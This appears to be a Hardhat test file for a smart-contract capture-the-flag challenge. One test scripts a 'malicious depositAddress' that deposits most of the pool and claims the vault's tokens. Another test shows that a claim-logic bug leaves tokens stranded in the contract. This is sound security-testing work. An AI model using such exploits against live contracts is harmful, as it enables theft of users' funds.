const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Attack", function () {
  let TestToken;
  let Challenge;
  let owner;
  let depositAddress;
  let addr1;
  let addr2;
  let addr3;
  let addr4;

  beforeEach(async function () {
    // Get the contract factories
    const TestTokenFactory = await ethers.getContractFactory("TestToken");
    const ChallengeFactory = await ethers.getContractFactory("Challenge");

    // Get the signers
    [owner, depositAddress, addr1, addr2, addr3, addr4] = await ethers.getSigners();

    // Deploy the contracts
    TestToken = await TestTokenFactory.deploy("TestToken", "TEST");
    Challenge = await ChallengeFactory.deploy(await depositAddress.getAddress());

    // Mint the TestTokens to the Challenge contract
    await TestToken.connect(owner).mint(100000, Challenge.address);

    // Set the TestToken as the vaultToken
    await Challenge.connect(owner).assignToken(TestToken.address);
  });

  it("Attack", async function () {
    // The deposit amounts for each user and the attacker
    const user1_deposit = ethers.utils.parseEther("1");
    const user2_deposit = ethers.utils.parseEther("2");
    const user3_deposit = ethers.utils.parseEther("3");
    const user4_deposit = ethers.utils.parseEther("4");
    const malicious_depositaddress_deposit = ethers.utils.parseEther("90");

    // Legitimate users deposit their tokens
    await Challenge.connect(addr1).depositEth({ value: user1_deposit });
    await Challenge.connect(addr2).depositEth({ value: user2_deposit });
    await Challenge.connect(addr3).depositEth({ value: user3_deposit });
    await Challenge.connect(addr4).depositEth({ value: user4_deposit });

    // Malicious depositAddress deposits their tokens
    await Challenge.connect(depositAddress).depositEth({ value: malicious_depositaddress_deposit });

    // Begin claiming
    await Challenge.connect(owner).beginClaim();

    // Malicious depositAddress claims their shares
    await Challenge.connect(depositAddress).claim();
  });

  it("Claim logic bug", async function () {
    // The deposit amounts for each user
    const user1_deposit = ethers.utils.parseEther("1");
    const user2_deposit = ethers.utils.parseEther("2");
    const user3_deposit = ethers.utils.parseEther("3");
    const user4_deposit = ethers.utils.parseEther("4");

    // Users deposit their tokens
    await Challenge.connect(addr1).depositEth({ value: user1_deposit });
    await Challenge.connect(addr2).depositEth({ value: user2_deposit });
    await Challenge.connect(addr3).depositEth({ value: user3_deposit });
    await Challenge.connect(addr4).depositEth({ value: user4_deposit });

    // Begin claiming
    await Challenge.connect(owner).beginClaim();

    // All users claim tokens
    await Challenge.connect(addr1).claim();
    await Challenge.connect(addr2).claim();
    await Challenge.connect(addr3).claim();
    await Challenge.connect(addr4).claim();

    // The contract should still have TestTokens because the distribution logic is incorrect
    const challengeTestTokenBalance = await TestToken.balanceOf(Challenge.address);
    expect(challengeTestTokenBalance).to.be.above(0);
  });
});
